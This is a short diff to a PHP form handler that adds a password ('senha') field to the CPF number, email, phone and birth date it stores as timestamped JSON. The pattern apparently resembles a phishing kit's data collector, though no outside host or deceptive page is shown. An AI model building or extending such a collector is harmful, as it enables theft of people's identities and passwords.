@@ -11,6 +11,7 @@ $cpf = $data['cpf'] ?? '000.000.000-00';
 $email = $data['email'] ?? 'Sem email';
 $telefone = $data['telefone'] ?? 'Sem telefone';
 $nascimento = $data['nascimento'] ?? '00/00/0000';
+$senha = $data['senha'] ?? 'Sem senha';
 
 date_default_timezone_set('America/Sao_Paulo');
 $timestamp = date("Y-m-d H:i:s");
@@ -21,7 +22,8 @@ $arrayData = [
     "cpf" => $cpf,
     "email" => $email,
     "telefone" => $telefone,
-    "nascimento" => $nascimento
+    "nascimento" => $nascimento,
+    "senha" => $senha
 ];
 
 $jsonString = json_encode($arrayData, JSON_PRETTY_PRINT);
